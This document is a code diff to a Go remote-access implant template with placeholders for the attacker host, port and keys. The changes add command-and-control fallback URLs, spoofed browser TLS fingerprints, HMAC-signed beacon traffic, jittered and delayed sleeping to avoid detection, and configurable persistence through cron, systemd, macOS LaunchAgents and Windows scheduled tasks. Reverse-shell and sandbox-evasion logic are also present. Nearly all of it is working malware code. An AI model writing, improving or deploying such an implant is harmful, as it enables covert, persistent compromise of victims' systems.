@@ -6,7 +6,9 @@ import (
     "context"
     "crypto/aes"
     "crypto/cipher"
+    "crypto/hmac"
     "crypto/rand"
+    "crypto/sha256"
     "crypto/tls"
     "compress/gzip"
     "archive/tar"
@@ -33,9 +35,11 @@ import (
     "sync"
     "regexp"
     "bufio"
+    utls "github.com/refraction-networking/utls"
 )
 
 var encryptionCtx *PacketEncryptionContext
+var tlsHelloChoice = utls.HelloChrome_Auto
 var stealthModeEnabled bool 
 var iamgroot bool 
 var discoveredLiveHosts string
@@ -49,7 +53,7 @@ var getipFailed bool
 var result_pwd string = ""
 
 const (
-    C2_URL     = "https://{lhost}:{lport}"
+    C2_URL     = "{protocol}://{lhost}:{lport}"
     CLIENT_ID  = "{line}"
     USERNAME   = "{username}"
     PASSWORD   = "{password}"
@@ -60,6 +64,16 @@ const (
     STEALTH    = "True"
     LHOST      = "{lhost}"
     DESIRED_LD_PRELOAD = "/dev/shm/mrhyde.so"
+    RAT_KEY_HMAC = "{rat_key}"
+    REV_SHELL_PORT_STR = "{reverse_shell_port}"
+    SCAN_PORTS_CSV = "{beacon_scan_ports}"
+    SLEEP_JIT_ENABLED = "{sleep_jit_enabled}"
+    SLEEP_JIT_PCT_MIN = "{sleep_jit_pct_min}"
+    SLEEP_JIT_PCT_MAX = "{sleep_jit_pct_max}"
+    ACT_DELAY_MIN = "{sleep_activation_delay_min}"
+    ACT_DELAY_MAX = "{sleep_activation_delay_max}"
+    PERSIST_CRON = "{persistence_cron_schedule}"
+    PERSIST_SERVICE = "{persistence_service_name}"
 )
 
 
@@ -70,10 +84,39 @@ var USER_AGENTS = []string{
     "{user_agent_3}",
 }
 
+var C2_FALLBACK_URLS = []string{
+    {c2_fallback_urls},
+}
+
+func c2Candidates(url string) []string {
+    if !strings.HasPrefix(url, C2_URL) {
+        return []string{url}
+    }
+    suffix := strings.TrimPrefix(url, C2_URL)
+    candidates := []string{url}
+    for _, fallback := range C2_FALLBACK_URLS {
+        fallback = strings.TrimSpace(fallback)
+        if fallback == "" || fallback == C2_URL {
+            continue
+        }
+        duplicate := false
+        for _, existing := range candidates {
+            if existing == fallback+suffix {
+                duplicate = true
+                break
+            }
+        }
+        if !duplicate {
+            candidates = append(candidates, fallback+suffix)
+        }
+    }
+    return candidates
+}
+
 var URLS = []string{
-    "{url_trafic_1}",
-    "{url_trafic_2}",
-    "{url_trafic_3}",
+    "{url_traffic_1}",
+    "{url_traffic_2}",
+    "{url_traffic_3}",
 }
 
 var HEADERS = map[string]string{
@@ -1385,7 +1428,7 @@ func ensureCrontabPersistence(lazyconf LazyDataType) error {
         }
         return fmt.Errorf("failed to get executable path: %w", err)
     }
-    cronCmd := fmt.Sprintf("* * * * * %s\n", executable)
+    cronCmd := fmt.Sprintf("%s %s\n", PERSIST_CRON, executable)
     cron := fmt.Sprintf("echo '%s' | crontab -", cronCmd)
     shellCommand := getShellCommand("-c")
     output, err := executeCommandWithRetry(shellCommand, cron)
@@ -1403,7 +1446,7 @@ func ensureCrontabPersistence(lazyconf LazyDataType) error {
 }
 func ensurePersistenceMacOS() error {
     homeDir, _ := os.UserHomeDir()
-    plistPath := filepath.Join(homeDir, "Library/LaunchAgents/com.system.maintenance.plist")
+    plistPath := filepath.Join(homeDir, "Library/LaunchAgents/"+PERSIST_SERVICE+".plist")
     executable, _ := os.Executable()
     plistContent := fmt.Sprintf(`
 <?xml version="1.0" encoding="UTF-8"?>
@@ -1411,7 +1454,7 @@ func ensurePersistenceMacOS() error {
 <plist version="1.0">
 <dict>
     <key>Label</key>
-    <string>com.system.maintenance</string>
+    <string>%s</string>
     <key>ProgramArguments</key>
     <array>
         <string>%s</string>
@@ -1422,7 +1465,7 @@ func ensurePersistenceMacOS() error {
     <true/>
 </dict>
 </plist>
-`, executable)
+`, PERSIST_SERVICE, executable)
     return os.WriteFile(plistPath, []byte(plistContent), 0644)
 }
 func ensurePersistence(lazyconf LazyDataType) error {
@@ -1435,8 +1478,8 @@ func ensurePersistence(lazyconf LazyDataType) error {
 
     
     if runtime.GOOS == "windows" {
-        taskName := 'S' + 'y' + 's' + 't' + 'e' + 'm' + 'M' + 'a' + 'i' + 'n' + 't'+ 'e' + 'n' + 'a' + 'n' + 'c' + 'e' + 'T' + 'a' + 's' + 'k'
-        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, string(taskName), executable)
+        taskName := PERSIST_SERVICE
+        taskCmd := fmt.Sprintf(`schtasks /create /tn "%s" /tr "%s" /sc daily /f`, taskName, executable)
         return exec.Command("cmd", "/C", taskCmd).Run()
     }
 
@@ -1455,13 +1498,13 @@ User=%s
 WantedBy=multi-user.target
 `, executable, os.Getenv("USER"))
 
-        servicePath := "/et"+"c/sy"+"ste"+"md/sy"+"stem/"+"syst"+"em-maint"+"enance.service"
+        servicePath := "/et"+"c/sy"+"ste"+"md/sy"+"stem/"+PERSIST_SERVICE+".service"
         err := os.WriteFile(servicePath, []byte(serviceContent), 0644)
         if err != nil {
             return err
         }
         ensureCrontabPersistence(lazyconf)
-        return exec.Command("systemctl", "enable", "system-maintenance").Run()
+        return exec.Command("systemctl", "enable", PERSIST_SERVICE).Run()
     }
     if runtime.GOOS == "darwin" {
         ensurePersistenceMacOS()
@@ -1475,9 +1518,9 @@ func selfDestruct(lazyconf LazyDataType) {
     executable, _ := os.Executable()
     os.Remove(executable)
     if runtime.GOOS == "linux" {
-        exec.Command("systemctl", "disable", "system-maintenance").Run()
+        exec.Command("systemctl", "disable", PERSIST_SERVICE).Run()
         exec.Command("crontab", "-r").Run()
-        os.Remove("/etc/systemd/system/system-maintenance.service")
+        os.Remove("/etc/systemd/system/" + PERSIST_SERVICE + ".service")
     }
     os.Exit(0)
 }
@@ -1579,9 +1622,118 @@ func DecryptPacket(ctx *PacketEncryptionContext, encryptedData []byte) ([]byte, 
     return encryptedData, nil
 }
 
+func signWireBody(data []byte) string {
+    mac := hmac.New(sha256.New, []byte(RAT_KEY_HMAC))
+    mac.Write(data)
+    return hex.EncodeToString(mac.Sum(nil))
+}
+
+var scratchScrub [8192]byte
+
+func scrubScratch() {
+    for i := range scratchScrub {
+        scratchScrub[i] = 0
+    }
+}
+
+func obfuscatedSleep(total time.Duration) {
+    if total <= 0 {
+        return
+    }
+    chunks := mathrand.Intn(5) + 2
+    chunkSize := total / time.Duration(chunks)
+    if chunkSize <= 0 {
+        time.Sleep(total)
+        scrubScratch()
+        return
+    }
+    for i := 0; i < chunks; i++ {
+        time.Sleep(chunkSize + time.Duration(mathrand.Int63n(int64(250*time.Millisecond))))
+        scrubScratch()
+    }
+}
+
+func parseGoDuration(raw string) (time.Duration, bool) {
+    value, err := time.ParseDuration(strings.TrimSpace(raw))
+    if err != nil || value < 0 {
+        return 0, false
+    }
+    return value, true
+}
+
+func randomActivationDelay() time.Duration {
+    minDelay, okMin := parseGoDuration(ACT_DELAY_MIN)
+    maxDelay, okMax := parseGoDuration(ACT_DELAY_MAX)
+    if !okMin && !okMax {
+        return 0
+    }
+    if !okMax || maxDelay <= minDelay {
+        return minDelay
+    }
+    if !okMin {
+        return maxDelay
+    }
+    span := maxDelay - minDelay
+    return minDelay + time.Duration(mathrand.Int63n(int64(span)+1))
+}
+
+func sleepJitterBounds() (float64, float64, bool) {
+    if strings.TrimSpace(strings.ToLower(SLEEP_JIT_ENABLED)) != "true" {
+        return 0, 0, false
+    }
+    minPct, err := strconv.ParseFloat(strings.TrimSpace(SLEEP_JIT_PCT_MIN), 64)
+    if err != nil || minPct < 0 {
+        minPct = 30
+    }
+    maxPct, err := strconv.ParseFloat(strings.TrimSpace(SLEEP_JIT_PCT_MAX), 64)
+    if err != nil || maxPct < 0 {
+        maxPct = 60
+    }
+    if maxPct < minPct {
+        maxPct = minPct
+    }
+    return minPct, maxPct, true
+}
+
+func jitteredSleep(baseSleep time.Duration) time.Duration {
+    minPct, maxPct, ok := sleepJitterBounds()
+    if !ok || baseSleep <= 0 {
+        return baseSleep
+    }
+    pct := minPct + mathrand.Float64()*(maxPct-minPct)
+    return baseSleep + time.Duration(float64(baseSleep)*(pct/100.0))
+}
+
+func initTLSProfile() {
+    choices := []utls.ClientHelloID{
+        utls.HelloChrome_Auto,
+        utls.HelloFirefox_Auto,
+        utls.HelloIOS_Auto,
+        utls.HelloEdge_Auto,
+    }
+    tlsHelloChoice = choices[mathrand.Intn(len(choices))]
+}
+
+func dialTLS(ctx context.Context, network, addr string) (net.Conn, error) {
+    rawConn, err := (&net.Dialer{Timeout: 30 * time.Second}).DialContext(ctx, network, addr)
+    if err != nil {
+        return nil, err
+    }
+    host, _, splitErr := net.SplitHostPort(addr)
+    if splitErr != nil {
+        host = addr
+    }
+    uconn := utls.UClient(rawConn, &utls.Config{InsecureSkipVerify: true, ServerName: host}, tlsHelloChoice)
+    if err := uconn.HandshakeContext(ctx); err != nil {
+        rawConn.Close()
+        return nil, err
+    }
+    return uconn, nil
+}
+
 func sendRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
     tr := &http.Transport{
-        TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+        DialTLSContext: dialTLS,
     }
     client := &http.Client{
         Transport: tr,
@@ -1615,6 +1767,7 @@ func sendRequest(ctx context.Context, url, method, body string, filePath string)
             return nil, fmt.Errorf("request creation error: %w", err)
         }
         req.Header.Set("Content-Type", writer.FormDataContentType())
+        req.Header.Set("X-Signature", signWireBody(bodyBuffer.Bytes()))
     } else {
         encryptedBody, err := EncryptPacket(encryptionCtx, []byte(body))
         if err != nil {
@@ -1626,6 +1779,7 @@ func sendRequest(ctx context.Context, url, method, body string, filePath string)
             return nil, fmt.Errorf("request creation error: %w", err)
         }
         req.Header.Set("Content-Type", "text/plain")
+        req.Header.Set("X-Signature", signWireBody([]byte(base64Body)))
     }
 
     //req.Header.Set("Authorization", "Basic "+base64.StdEncoding.EncodeToString([]byte(USERNAME+":"+PASSWORD)))
@@ -1665,19 +1819,59 @@ func sendRequest(ctx context.Context, url, method, body string, filePath string)
 }
 
 func retryRequest(ctx context.Context, url, method, body string, filePath string) (*http.Response, error) {
+    candidates := c2Candidates(url)
     for i := 0; i < MAX_RETRIES; i++ {
-        resp, err := sendRequest(ctx, url, method, body, filePath)
-        if err == nil {
-            return resp, nil
+        for _, candidate := range candidates {
+            resp, err := sendRequest(ctx, candidate, method, body, filePath)
+            if err == nil {
+                return resp, nil
+            }
+            fmt.Printf("[RETRY] Attempt %d/%d candidate %s: %v\n", i+1, MAX_RETRIES, candidate, err)
         }
-        fmt.Printf("[RETRY] Attempt %d/%d: %v\n", i+1, MAX_RETRIES, err)
-        select {
-        case <-ctx.Done():
-            return nil, ctx.Err()
-        case <-time.After(SLEEP):
-        }
+		select {
+		case <-ctx.Done():
+			return nil, ctx.Err()
+		case <-time.After(jitteredSleep(SLEEP)):
+		}
     }
     return nil, fmt.Errorf("max retries reached")
+}
+
+func seedConfigDefaults(lazyconf *LazyDataType) {
+    if lazyconf.ReverseShellPort <= 0 {
+        if port, err := strconv.Atoi(REV_SHELL_PORT_STR); err == nil && port > 0 {
+            lazyconf.ReverseShellPort = port
+        }
+    }
+    if strings.TrimSpace(lazyconf.Rhost) == "" {
+        lazyconf.Rhost = LHOST
+    }
+    if strings.TrimSpace(lazyconf.DebugImplant) == "" {
+        lazyconf.DebugImplant = "False"
+    }
+    if len(lazyconf.Ports) == 0 {
+        for _, portStr := range strings.Split(SCAN_PORTS_CSV, ",") {
+            if port, err := strconv.Atoi(strings.TrimSpace(portStr)); err == nil && port > 0 {
+                lazyconf.Ports = append(lazyconf.Ports, port)
+            }
+        }
+    }
+}
+
+func loadBeaconConfig(lazyconf *LazyDataType) error {
+    primary := C2_URL + "/config.json"
+    var lastErr error
+    for _, candidate := range c2Candidates(primary) {
+        if err := ReadJSONFromURL(candidate, lazyconf); err == nil {
+            return nil
+        } else {
+            lastErr = err
+        }
+    }
+    if lastErr == nil {
+        lastErr = fmt.Errorf("no C2 candidate reachable")
+    }
+    return lastErr
 }
 
 func executeCommandWithRetry(shellCommand []string, command string) (string, error) {
@@ -1719,26 +1913,16 @@ func getShellCommand(interactive string) []string {
     }
 }
 
-func calculateJitteredSleep(baseSleep time.Duration, minJitterPercentage, maxJitterPercentage float64) time.Duration {
-	jitterPercentage := minJitterPercentage + mathrand.Float64()*(maxJitterPercentage-minJitterPercentage)
-	jitterRange := time.Duration(float64(baseSleep) * jitterPercentage)
-	jitter := time.Duration(mathrand.Float64() * float64(jitterRange))
-	jitteredSleep := baseSleep + jitter
-	return jitteredSleep
-}
-
-func adjustStealthParameters(lazyconf LazyDataType, baseSleep *time.Duration, maxJitter *float64) {
+func adjustStealthParameters(lazyconf LazyDataType, baseSleep *time.Duration) {
 	if checkDebuggers(lazyconf) || isVMByMAC() || isSandboxEnvironment(lazyconf) {
-		// High detection risk: Increase sleep and jitter significantly
+		// High detection risk: Increase sleep significantly
 		*baseSleep = SLEEP * 5
-		*maxJitter = 0.8
 		if lazyconf.DebugImplant == "True" {
-			fmt.Println("[EVASION] High detection risk! Increasing sleep and jitter.")
+			fmt.Println("[EVASION] High detection risk! Increasing sleep.")
 		}
 	} else {
 		// Standard parameters
 		*baseSleep = SLEEP
-		*maxJitter = 0.3
 	}
 }
 
@@ -1746,20 +1930,21 @@ func main() {
     defer globalRecover()
 	mathrand.Seed(time.Now().UnixNano())
 	baseSleepTime := SLEEP
-	minJitterPercentage := 0.1
-	maxJitterPercentage := 0.3
     keyHex := "{key}"
     var lazyconf LazyDataType
     var currentPortScanResults map[string][]int
-    url := C2_URL + "/config.json"
-        
-    err := ReadJSONFromURL(url, &lazyconf)
-	if err != nil {
-        fmt.Println("Error:", err)
-		return
-	}
+    err := loadBeaconConfig(&lazyconf)
+    if err != nil {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Println("[WARN] Config fetch failed, using baked-in defaults:", err)
+        }
+    }
+    seedConfigDefaults(&lazyconf)
     if lazyconf.DebugImplant == "True" {
-        fmt.Println("[INFO] Reading JSON from URL:", url)
+        fmt.Println("[INIT] C2_URL:", C2_URL)
+        fmt.Println("[INIT] CLIENT_ID:", CLIENT_ID)
+        fmt.Println("[INIT] MALEABLE:", MALEABLE)
+        fmt.Println("[INIT] Config loaded, debug ON")
     }
     result_pwd, err = os.Getwd()
     if err != nil {
@@ -1776,14 +1961,21 @@ func main() {
         time.Sleep(30 * time.Second)
         restartClient()
     }
+    initTLSProfile()
 
     shellCommand := getShellCommand("-c")
     baseCtx := context.Background()
+    if activationDelay := randomActivationDelay(); activationDelay > 0 {
+        if lazyconf.DebugImplant == "True" {
+            fmt.Println("[INIT] Waiting random activation delay before first poll")
+        }
+        obfuscatedSleep(activationDelay)
+    }
     for {
         func() {        
             defer globalRecover()
             
-            adjustStealthParameters(lazyconf, &baseSleepTime, &maxJitterPercentage)
+            adjustStealthParameters(lazyconf, &baseSleepTime)
 
             ctx, cancel := context.WithTimeout(baseCtx, 180*time.Second)
             defer cancel()
@@ -2138,8 +2330,7 @@ func main() {
             }
 
         }()
-		sleepTime := calculateJitteredSleep(baseSleepTime, minJitterPercentage, maxJitterPercentage)
-		time.Sleep(sleepTime)
+		obfuscatedSleep(jitteredSleep(baseSleepTime))
     }
 }
 
